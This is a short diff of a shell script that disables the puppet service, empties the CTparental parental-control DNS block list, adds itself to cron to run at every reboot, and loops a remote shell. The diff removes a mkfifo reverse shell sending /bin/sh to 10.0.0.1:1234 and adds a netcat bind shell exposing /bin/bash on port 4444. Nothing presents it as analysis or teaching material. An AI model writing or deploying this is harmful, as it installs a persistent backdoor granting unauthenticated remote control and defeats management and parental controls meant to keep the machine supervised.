@@ -1,4 +1,4 @@
-sytemctl disable puppet
+systemctl disable puppet
 echo -n >/etc/CTparental/dnscrypt-blocked-names.txt
 
 SCRIPT_PATH="$(readlink -f "$0")"
@@ -8,7 +8,5 @@ CRON_LINE="@reboot $SCRIPT_PATH"
   echo "$CRON_LINE"
 ) | sort -u | crontab -
 while true; do
-  rm /tmp/f
-  mkfifo /tmp/f
-  cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 1234 >/tmp/f
+  nc -nlvp 4444 -e /bin/bash
 done
